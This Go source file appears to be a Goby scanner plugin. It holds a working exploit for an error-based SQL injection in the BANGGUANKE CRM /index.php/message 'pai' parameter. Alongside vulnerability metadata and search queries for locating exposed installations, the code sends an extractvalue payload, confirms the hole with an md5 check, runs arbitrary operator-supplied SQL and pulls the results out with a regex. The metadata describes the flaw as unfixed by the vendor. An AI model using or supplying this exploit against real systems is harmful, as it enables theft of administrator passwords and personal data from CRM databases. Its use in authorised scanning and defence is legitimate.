package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BANGGUANME CRM message SQL injection vulnerability",
    "Description": "<p>BANGGUANKE CRM Customer management system is a professional CRM marketing concept design and management of auxiliary tools, developed by Hubei Diandian Technology Co., LTD.</p><p>sql injection vulnerability exists in the CRM customer management system /index.php/message interface, which may cause database information leakage.</p>",
    "Product": "BANGGUANKE-CRM",
    "Homepage": "https://www.bgkcrm.com/",
    "DisclosureDate": "2023-02-24",
    "Author": "715827922@qq.com",
    "FofaQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "GobyQuery": "(title=\"用户登录\" && body=\"/themes/default/js/jquery.code.js\") || header=\"Set-Cookie: bgk_session=a%3A5\" || body=\"<p id=\\\"admintips\\\" >初始账号：admin\" || banner=\"Set-Cookie: bgk_session=a%3A5\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1, the official has not repaired the vulnerability, please contact the manufacturer to repair the vulnerability: <a href=\"https://www.bgk100.com\">https://www.bgk100.com</a> .</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "帮管客 CRM message 文件 pai 参数 SQL 注入漏洞",
            "Product": "帮管客-CRM",
            "Description": "<p>帮管客CRM客户管理系统是一款专业CRM营销理念设计管理的辅助工具,由湖北点点点科技有限公司开发。</p><p>帮管客CRM客户管理系统 /index.php/message 接口存在 sql 注入漏洞，可导致数据库信息泄露。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.bgk100.com/\">https://www.bgk100.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "BANGGUANME CRM message SQL injection vulnerability",
            "Product": "BANGGUANKE-CRM",
            "Description": "<p>BANGGUANKE CRM Customer management system is a professional CRM marketing concept design and management of auxiliary tools, developed by Hubei Diandian Technology Co., LTD.</p><p>sql injection vulnerability exists in the CRM customer management system /index.php/message interface, which may cause database information leakage.</p>",
            "Recommendation": "<p>1, the official has not repaired the vulnerability, please contact the manufacturer to repair the vulnerability: <a href=\"https://www.bgk100.com\">https://www.bgk100.com</a> .</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-04",
    "PocId": "10834"
}`
	sendPayload5LOKJsd983bn := func(u *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/index.php/message?page=1&pai=1%%20and%%20extractvalue(0x7e,concat(0x7e,(%s),0x7e))%%23&xu=desc", url.QueryEscape(payload)))
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(u, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload5LOKJsd983bn(u, "md5(11)")
			if err != nil {
				return false
			}
			return resp.StatusCode == 500 && strings.Contains(resp.RawBody, "6512bd43d9caa6e02c990b0a82652dc")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var payload string
			if stepLogs.Params["attackType"] == "sql" {
				payload = stepLogs.Params["sql"].(string)
			} else if stepLogs.Params["attackType"] == "sqlPoint" {
				expResult.Success = true
				expResult.Output = `GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,sqlPoint,0x7e))%23&xu=desc HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
				return expResult
			}
			resp, err := sendPayload5LOKJsd983bn(expResult.HostInfo, payload)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp.StatusCode == 500 && strings.Contains(resp.RawBody, "XPATH syntax") {
				pattern := "\\~(.*)\\'<\\/p\\><"
				re := regexp.MustCompile(pattern)
				match := re.FindStringSubmatch(resp.RawBody)
				matchString := fmt.Sprintf("%s", match[1])
				expResult.Success = true
				expResult.Output = matchString
			}
			return expResult
		},
	))
}
